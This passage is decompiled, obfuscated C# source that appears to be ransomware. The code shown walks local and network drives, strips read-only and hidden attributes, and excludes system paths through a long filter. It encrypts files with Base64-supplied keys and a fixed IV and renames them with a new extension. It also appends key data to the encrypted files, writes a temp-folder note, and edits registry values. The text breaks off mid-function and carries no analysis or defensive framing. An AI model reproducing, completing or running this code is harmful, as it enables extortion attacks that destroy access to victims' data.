				if (registryKey != null)
				{
					registryKey.DeleteSubKey(ZvzUuZdcuZvZyuA(getString_0(107387597)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			mFLmLCPYHuB(ZvzUuZdcuZvZyuA(getString_0(107387563)), ZvzUuZdcuZvZyuA(getString_0(107387514)));
			mFLmLCPYHuB(ZvzUuZdcuZvZyuA(getString_0(107388009)), ZvzUuZdcuZvZyuA(gZenGKRaZbbcTPvN(getString_0(107388000))));
			mFLmLCPYHuB(ZvzUuZdcuZvZyuA(getString_0(107388009)), ZvzUuZdcuZvZyuA(getString_0(107387854)));
			mFLmLCPYHuB(ZvzUuZdcuZvZyuA(getString_0(107387761)), ZvzUuZdcuZvZyuA(getString_0(107387776)));
		}
		catch
		{
		}
	}

	public static void sgeKhRYEDh(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(ZvzUuZdcuZvZyuA(getString_0(107387159)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void aGwtOoMgGMuO()
	{
		string string_ = gZenGKRaZbbcTPvN(getString_0(107387134));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(ZvzUuZdcuZvZyuA(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(ZvzUuZdcuZvZyuA(getString_0(107387085)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	[DllImport("mpr.dll")]
	private static extern int WNetGetUniversalNameA(string string_0, int int_0, IntPtr intptr_0, ref int int_1);

	private static string vgWhOrzsabWdcJL(string UbAMPSYHHFTuTg, int FaqnfvtKLJC = 2000)
	{
		IntPtr intPtr;
		try
		{
			intPtr = Marshal.AllocHGlobal(FaqnfvtKLJC);
		}
		catch (OutOfMemoryException)
		{
			return null;
		}
		try
		{
			if (WNetGetUniversalNameA(UbAMPSYHHFTuTg, 1, intPtr, ref FaqnfvtKLJC) != 0)
			{
				return null;
			}
			return Marshal.PtrToStringAnsi(Marshal.ReadIntPtr(intPtr));
		}
		catch (Exception)
		{
			return null;
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
	}

	public static void yExfGaYYDORBn()
	{
		mFLmLCPYHuB(getString_0(107396719), ZvzUuZdcuZvZyuA(getString_0(107387052)));
		string text = ZvzUuZdcuZvZyuA(getString_0(107387370));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107388896) + text + getString_0(107388896) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107396719);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void DnuJfeBIbLhr(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (MvyzXvhzMsIEWT)
			{
				try
				{
					File.AppendAllText(knClGxGTQzcKgW, getString_0(107387305) + string_0 + getString_0(107387296) + ex.Message + getString_0(107395924));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string ykfhcMmkJbZl()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107389588);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107386695);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107386686))) ? getString_0(107386700) : getString_0(107386677));
				break;
			case 0:
				text = getString_0(107386723);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107386690);
				break;
			case 4:
				text = getString_0(107386645);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107386659) : getString_0(107386668));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107386635) : getString_0(107386608)) : getString_0(107386613)) : getString_0(107386622));
				break;
			case 10:
				text = getString_0(107386630);
				break;
			}
		}
		if (text != getString_0(107389588))
		{
			text = getString_0(107386625) + text;
			if (oSVersion.ServicePack != getString_0(107389588))
			{
				text = text + getString_0(107388513) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string BibwqCoyfRe(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395545);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(ZvzUuZdcuZvZyuA(getString_0(107395512)));
				streamWriter.WriteLine(getString_0(107395924));
				streamWriter.WriteLine(ZvzUuZdcuZvZyuA(getString_0(107390086)));
				streamWriter.WriteLine(string_0);
				if (mYYMBtfmlAOyF)
				{
					streamWriter.WriteLine(getString_0(107395924));
					streamWriter.WriteLine(ZvzUuZdcuZvZyuA(getString_0(107390456)));
					streamWriter.WriteLine(PpFuqDxUfCPuFpcCn.zsSYEipMaODL());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !dludHStvHyTu)
				{
					File.AppendAllText(text, getString_0(107390423) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (MvyzXvhzMsIEWT)
			{
				try
				{
					File.AppendAllText(knClGxGTQzcKgW, getString_0(107386580) + ex.Message + getString_0(107395924));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void jhWfaAEppEnwN(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		bQMuOMVNLi.mBxiTffIXXN CS_0024_003C_003E8__locals0 = new bQMuOMVNLi();
		CS_0024_003C_003E8__locals0.COqpewCWUx = string_1;
		CS_0024_003C_003E8__locals0.rmmGSKNeUJBK = string_2;
		CS_0024_003C_003E8__locals0.FzKQijQPMSBxG = string_3;
		CS_0024_003C_003E8__locals0.TcWQUPeqHrK = string_4;
		if (kwNUHYKFODh && !ykfhcMmkJbZl().Contains(getString_0(107386659)) && !ykfhcMmkJbZl().Contains(getString_0(107386523)))
		{
			jPbnLxaOSWyK.skHMZposwcMERO();
		}
		INlpeyNXGAcMRYsht = Convert.FromBase64String(CS_0024_003C_003E8__locals0.FzKQijQPMSBxG);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107396204))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (!array[i].IsReady || array[i].DriveType == DriveType.CDRom)
					{
						continue;
					}
					if (array[i].DriveType == DriveType.Network)
					{
						try
						{
							string text = vgWhOrzsabWdcJL(array[i].Name);
							if (!string.IsNullOrEmpty(text) && !YyCNsMjoVMOoP.Contains(text))
							{
								YyCNsMjoVMOoP.Add(text);
							}
							else if (!YyCNsMjoVMOoP.Contains(array[i].Name))
							{
								YyCNsMjoVMOoP.Add(array[i].Name);
							}
						}
						catch (Exception)
						{
							if (!YyCNsMjoVMOoP.Contains(array[i].Name))
							{
								YyCNsMjoVMOoP.Add(array[i].Name);
							}
						}
					}
					else if (!YyCNsMjoVMOoP.Contains(array[i].Name))
					{
						YyCNsMjoVMOoP.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!YyCNsMjoVMOoP.Contains(string_0[j]))
				{
					YyCNsMjoVMOoP.Add(string_0[j]);
				}
			}
		}
		if (YyCNsMjoVMOoP.Contains(ZvzUuZdcuZvZyuA(getString_0(107386542))) && oAHTjawhYVeZf == getString_0(107396816))
		{
			YyCNsMjoVMOoP.Remove(ZvzUuZdcuZvZyuA(getString_0(107386542)));
		}
		Parallel.ForEach(YyCNsMjoVMOoP, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new bQMuOMVNLi.mBxiTffIXXN();
			CS_0024_003C_003E8__locals0.ByFbriXeLG = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.hPVYSKCLhZQex = string_0;
			if (YMNrvxnhNxvEzz && !ykfhcMmkJbZl().Contains(bQMuOMVNLi.getString_0(107386669)) && !ykfhcMmkJbZl().Contains(bQMuOMVNLi.getString_0(107386533)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						NEtTtiYUXuvT(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.hPVYSKCLhZQex);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (AaFKnZpVmxll == bQMuOMVNLi.getString_0(107396826))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					MnPibeJKWWmlF(CS_0024_003C_003E8__locals0.hPVYSKCLhZQex, CS_0024_003C_003E8__locals0.ByFbriXeLG.COqpewCWUx, CS_0024_003C_003E8__locals0.ByFbriXeLG.TcWQUPeqHrK, CS_0024_003C_003E8__locals0.ByFbriXeLG.rmmGSKNeUJBK, CS_0024_003C_003E8__locals0.ByFbriXeLG.FzKQijQPMSBxG);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				MnPibeJKWWmlF(CS_0024_003C_003E8__locals0.hPVYSKCLhZQex, CS_0024_003C_003E8__locals0.COqpewCWUx, CS_0024_003C_003E8__locals0.TcWQUPeqHrK, CS_0024_003C_003E8__locals0.rmmGSKNeUJBK, CS_0024_003C_003E8__locals0.FzKQijQPMSBxG);
			}
		});
	}

	public static void MnPibeJKWWmlF(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107389588));
		List<string> list3 = list2;
		if (NsXmyOpOsw == getString_0(107396382))
		{
			if (GUROFNYdsapXwV == getString_0(107396816) && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && HNCtPnvTGiWcK(string_0))
			{
				UxBkfBcbcDfp uxBkfBcbcDfp = null;
				try
				{
					uxBkfBcbcDfp = new UxBkfBcbcDfp(string_0.Replace(getString_0(107396738), getString_0(107389588)));
				}
				catch
				{
					list = QRCbDmMpcCOF(string_0, string_1, string_2, string_3, string_4);
					return;
				}
				try
				{
					ySmKxcFKUvGO(uxBkfBcbcDfp.ToArray().ToList(), string_1, string_2, string_3, string_4);
					return;
				}
				catch (Exception)
				{
					list = QRCbDmMpcCOF(string_0, string_1, string_2, string_3, string_4);
					return;
				}
			}
			list = QRCbDmMpcCOF(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = pxHSVPxzzLpnQ.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0453;
					}
				}
				if ((eCuVMSxuue == getString_0(107396382) && !item.EndsWith(text)) || bTWTPdqAFFpauU.Contains(item))
				{
					continue;
				}
				if (JvLbPnAiNtPFl == getString_0(107396816))
				{
					try
					{
						if (xNneCkeMZRvxQg.rdTUqItxjMreSCf(item))
						{
							xNneCkeMZRvxQg.IliDSuvIRJoA(item);
						}
					}
					catch
					{
					}
				}
				bTWTPdqAFFpauU.Add(item);
				if (!cVxpfEOwEmPC.Contains(Path.GetDirectoryName(item)))
				{
					cVxpfEOwEmPC.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (AjDKbvSruxge == getString_0(107396816) && fileStream.Length > Convert.ToInt32(vmbpzaFVaVU) * 1024 * 1024 && !list3.Contains(text))
					{
						if (FGSbbxnupor == getString_0(107396816))
						{
							foreach (string item2 in SkvTXsJINBztMRD)
							{
								if (item.ToLower().EndsWith(item2) && eiZgJNzJZhH == getString_0(107396816))
								{
									if (Convert.ToInt32(QBNkovNHjRPLm) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											PpFuqDxUfCPuFpcCn.yOpVYrZhtvsYB(getString_0(107389701), getString_0(107389696), getString_0(107389651), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && eiZgJNzJZhH == getString_0(107396382))
								{
									try
									{
										PpFuqDxUfCPuFpcCn.yOpVYrZhtvsYB(getString_0(107389701), getString_0(107389696), getString_0(107389651), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = hLhUwUDAhWMjzuB.DfGjgEHjZJUE(item, Convert.ToInt32(vmbpzaFVaVU) * 1024 * 1024);
						byte[] yTrxIKISCfGp = hLhUwUDAhWMjzuB.kRJzGPxkoWlQg(byte_, Convert.FromBase64String(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						hLhUwUDAhWMjzuB.LDXgNdvfAheSqfs(item, yTrxIKISCfGp);
						if (string_2 != getString_0(107386533))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107386533))
					{
						CgmxXIFkBUDnX(item, item + string_2, INlpeyNXGAcMRYsht);
					}
					else
					{
						CgmxXIFkBUDnX(item, item + getString_0(107386528), INlpeyNXGAcMRYsht);
					}
				}
				catch (Exception)
				{
				}
				IL_0453:;
			}
		}
	}

	public static void ySmKxcFKUvGO(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		NxpTIMrohu.wIiqciEKsSgyz CS_0024_003C_003E8__locals0 = new NxpTIMrohu();
		CS_0024_003C_003E8__locals0.RXnxbMGGkHM = list_0;
		CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ = string_1;
		CS_0024_003C_003E8__locals0.omzlEvaIgXI = string_2;
		CS_0024_003C_003E8__locals0.MmaHtQgyFtb = string_3;
		CS_0024_003C_003E8__locals0.FaezQiFiBmg = new List<string> { getString_0(107389588) };
		if (eCuVMSxuue == getString_0(107396382))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				using List<string>.Enumerator enumerator2 = CS_0024_003C_003E8__locals0.RXnxbMGGkHM.GetEnumerator();
				while (enumerator2.MoveNext())
				{
					NxpTIMrohu.DPkNfhpVfmzs CS_0024_003C_003E8__locals1 = new NxpTIMrohu.DPkNfhpVfmzs();
					CS_0024_003C_003E8__locals1.KkLhvrADszGGi = CS_0024_003C_003E8__locals0;
					CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv = enumerator2.Current;
					if (!CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(NxpTIMrohu.getString_0(107389062)) && !CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(NxpTIMrohu.getString_0(107389549)) && !CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(NxpTIMrohu.getString_0(107389516)) && !CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.ToLower().Contains(NxpTIMrohu.getString_0(107389531)) && !CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.ToLower().Contains(NxpTIMrohu.getString_0(107389486)) && !CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(NxpTIMrohu.getString_0(107389493)) && !CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(NxpTIMrohu.getString_0(107389472)) && !CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.ToLower().Contains(NxpTIMrohu.getString_0(107389459)) && !CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.ToLower().Contains(NxpTIMrohu.getString_0(107389414)) && !CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.ToLower().Contains(NxpTIMrohu.getString_0(107389409)) && !CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.ToLower().Contains(NxpTIMrohu.getString_0(107389400)) && !CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.ToLower().Contains(NxpTIMrohu.getString_0(107389351)) && !CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.ToLower().Contains(NxpTIMrohu.getString_0(107389325)) && !CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.ToLower().Contains(NxpTIMrohu.getString_0(107389336)) && !CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(NxpTIMrohu.getString_0(107388799)) && !CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(NxpTIMrohu.getString_0(107388750)) && !CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(NxpTIMrohu.getString_0(107388765)) && !CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(NxpTIMrohu.getString_0(107388716)) && !CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(NxpTIMrohu.getString_0(107388731)) && !CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(NxpTIMrohu.getString_0(107388682)) && !CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(NxpTIMrohu.getString_0(107388697)) && !CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(NxpTIMrohu.getString_0(107388648)) && !CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(NxpTIMrohu.getString_0(107388667)) && !CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(NxpTIMrohu.getString_0(107388614)) && !CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.ToLower().Contains(NxpTIMrohu.getString_0(107388633)) && !CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.ToLower().Contains(NxpTIMrohu.getString_0(107388588)) && !CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.ToLower().Contains(NxpTIMrohu.getString_0(107388603)) && !CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.ToLower().Contains(NxpTIMrohu.getString_0(107388554)) && !CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(ZvzUuZdcuZvZyuA(NxpTIMrohu.getString_0(107388569))) && !CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(NxpTIMrohu.getString_0(107389056)) && !CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(NxpTIMrohu.getString_0(107397084)) && !CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(NxpTIMrohu.getString_0(107389043)) && !CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.EndsWith(CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ) && !CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.EndsWith(NxpTIMrohu.getString_0(107389018)) && !CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.EndsWith(NxpTIMrohu.getString_0(107389013)) && !CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.EndsWith(NxpTIMrohu.getString_0(107388976)) && !CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.EndsWith(NxpTIMrohu.getString_0(107388971)) && !CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(NxpTIMrohu.getString_0(107388966)) && !CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(hdtcmoyGEV) && !CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(knClGxGTQzcKgW) && !CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(WkbYpntLeHaVcf))
					{
						if (CS_0024_003C_003E8__locals0.omzlEvaIgXI.Length != 0)
						{
							string[] omzlEvaIgXI2 = CS_0024_003C_003E8__locals0.omzlEvaIgXI;
							int num2 = 0;
							while (num2 < omzlEvaIgXI2.Length)
							{
								string value2 = omzlEvaIgXI2[num2];
								if (!CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.EndsWith(value2))
								{
									num2++;
									continue;
								}
								goto IL_1119;
							}
						}
						try
						{
							if (CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.EndsWith(CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ))
							{
								goto IL_1119;
							}
						}
						catch (Exception)
						{
							goto IL_1119;
						}
						if (CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.EndsWith(string_0) && !bTWTPdqAFFpauU.Contains(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv))
						{
							if (JvLbPnAiNtPFl == NxpTIMrohu.getString_0(107396834))
							{
								try
								{
									if (xNneCkeMZRvxQg.rdTUqItxjMreSCf(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv))
									{
										xNneCkeMZRvxQg.IliDSuvIRJoA(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv);
									}
								}
								catch
								{
								}
							}
							bTWTPdqAFFpauU.Add(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv);
							Thread thread3 = new Thread((ThreadStart)delegate
							{
								try
								{
									if (hdAepnrmnch)
									{
										Console.WriteLine(NxpTIMrohu.DPkNfhpVfmzs.getString_0(107402484) + CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + NxpTIMrohu.DPkNfhpVfmzs.getString_0(107402893) + new FileInfo(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv).Length + NxpTIMrohu.DPkNfhpVfmzs.getString_0(107402904));
										Console.WriteLine(NxpTIMrohu.DPkNfhpVfmzs.getString_0(107402491), bTWTPdqAFFpauU.Count, ZxYqzVUoLKX, bBKKzTBaLJVhdj);
										Console.WriteLine(NxpTIMrohu.DPkNfhpVfmzs.getString_0(107402434), iprsjxEHICCj.Elapsed);
										Console.WriteLine(NxpTIMrohu.DPkNfhpVfmzs.getString_0(107403375));
									}
								}
								catch
								{
								}
							});
							thread3.Priority = ThreadPriority.Normal;
							thread3.IsBackground = true;
							thread3.Start();
							if (!cVxpfEOwEmPC.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv)))
							{
								cVxpfEOwEmPC.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv));
							}
							DnuJfeBIbLhr(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv);
							try
							{
								new NTQxrgSdsWceAc().mAZxWbHOwVEf(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv);
							}
							catch
							{
							}
							try
							{
								using FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv, FileMode.Open, FileAccess.Write);
								if (!fileStream2.CanWrite)
								{
									try
									{
										if (hdAepnrmnch)
										{
											Console.WriteLine(NxpTIMrohu.getString_0(107402967) + CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + NxpTIMrohu.getString_0(107402890) + new FileInfo(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv).Length + NxpTIMrohu.getString_0(107402901));
											Console.WriteLine(NxpTIMrohu.getString_0(107403372));
										}
									}
									catch
									{
									}
									mFLmLCPYHuB(ZvzUuZdcuZvZyuA(NxpTIMrohu.getString_0(107403267)), NxpTIMrohu.getString_0(107388914) + CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + NxpTIMrohu.getString_0(107388914) + ZvzUuZdcuZvZyuA(NxpTIMrohu.getString_0(107403242)) + NxpTIMrohu.getString_0(107388914) + Environment.UserName + NxpTIMrohu.getString_0(107388914) + ZvzUuZdcuZvZyuA(NxpTIMrohu.getString_0(107403257)));
								}
							}
							catch (Exception ex18)
							{
								if (MvyzXvhzMsIEWT)
								{
									try
									{
										File.AppendAllText(knClGxGTQzcKgW, NxpTIMrohu.getString_0(107387323) + CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + NxpTIMrohu.getString_0(107403232) + ex18.Message + NxpTIMrohu.getString_0(107395942));
									}
									catch (Exception)
									{
									}
								}
								continue;
							}
							try
							{
								try
								{
									if (new FileInfo(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv).Length != 0L)
									{
										goto end_IL_08ba;
									}
									goto end_IL_08ba_2;
									end_IL_08ba:;
								}
								catch (Exception ex20)
								{
									if (MvyzXvhzMsIEWT)
									{
										try
										{
											File.AppendAllText(knClGxGTQzcKgW, NxpTIMrohu.getString_0(107387323) + CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + NxpTIMrohu.getString_0(107402607) + ex20.Message + NxpTIMrohu.getString_0(107395942));
										}
										catch (Exception)
										{
										}
									}
									bBKKzTBaLJVhdj++;
									goto end_IL_08ba_2;
								}
								if (!(AjDKbvSruxge == NxpTIMrohu.getString_0(107396834)) || new FileInfo(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv).Length <= Convert.ToInt32(vmbpzaFVaVU) * 1024 * 1024 || CS_0024_003C_003E8__locals0.FaezQiFiBmg.Contains(string_0))
								{
									if (mYYMBtfmlAOyF)
									{
										CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ = zmgIWyNctPwjW + CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ;
									}
									string text5 = COHaNSLBjuDxHFZgW.zPVjtudhZgOqH(32);
									string text6 = NxpTIMrohu.getString_0(107389606);
									text6 = (dludHStvHyTu ? COHaNSLBjuDxHFZgW.POLqBalRuwH() : NxpTIMrohu.getString_0(107389606));
									string s3 = wAtanfYbhauOuKP.MvqOeoNjtEKI(text5 + text6);
									byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
									if (CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ != NxpTIMrohu.getString_0(107386551))
									{
										if (!kIbCIqqAMtB)
										{
											if (!dludHStvHyTu)
											{
												FzWLEbFhnFTpMlZv(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv, CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ, INlpeyNXGAcMRYsht);
											}
											else
											{
												FzWLEbFhnFTpMlZv(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv, CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ, Convert.FromBase64String(text5));
											}
										}
										else
										{
											try
											{
												if (!dludHStvHyTu)
												{
													EPFgKsSOzMWL(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv, CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ, INlpeyNXGAcMRYsht, Convert.FromBase64String(zSiinLyeiNOaQic));
												}
												else
												{
													EPFgKsSOzMWL(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv, CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ, Convert.FromBase64String(text5), Convert.FromBase64String(text6));
												}
											}
											catch (Exception ex22)
											{
												if (MvyzXvhzMsIEWT)
												{
													try
													{
														File.AppendAllText(knClGxGTQzcKgW, NxpTIMrohu.getString_0(107387323) + CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + NxpTIMrohu.getString_0(107386505) + ex22.Message + NxpTIMrohu.getString_0(107395942));
													}
													catch (Exception)
													{
													}
												}
												bBKKzTBaLJVhdj++;
												try
												{
													File.Move(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ, CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv);
												}
												catch (Exception)
												{
												}
												goto end_IL_08ba_2;
											}
										}
									}
									else if (!kIbCIqqAMtB)
									{
										if (!dludHStvHyTu)
										{
											FzWLEbFhnFTpMlZv(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv, CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + NxpTIMrohu.getString_0(107386546), INlpeyNXGAcMRYsht);
										}
										else
										{
											FzWLEbFhnFTpMlZv(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv, CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + NxpTIMrohu.getString_0(107386546), Convert.FromBase64String(text5));
										}
									}
									else
									{
										try
										{
											if (!dludHStvHyTu)
											{
												EPFgKsSOzMWL(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv, CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv, INlpeyNXGAcMRYsht, Convert.FromBase64String(zSiinLyeiNOaQic));
											}
											else
											{
												EPFgKsSOzMWL(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv, CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv, Convert.FromBase64String(text5), Convert.FromBase64String(text6));
											}
										}
										catch (Exception ex25)
										{
											if (MvyzXvhzMsIEWT)
											{
												try
												{
													File.AppendAllText(knClGxGTQzcKgW, NxpTIMrohu.getString_0(107387323) + CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + NxpTIMrohu.getString_0(107386505) + ex25.Message + NxpTIMrohu.getString_0(107395942));
												}
												catch (Exception)
												{
												}
											}
											bBKKzTBaLJVhdj++;
											goto end_IL_08ba_2;
										}
									}
									if (dludHStvHyTu)
									{
										if (CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ != NxpTIMrohu.getString_0(107386551))
										{
											sgeKhRYEDh(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ, bytes3);
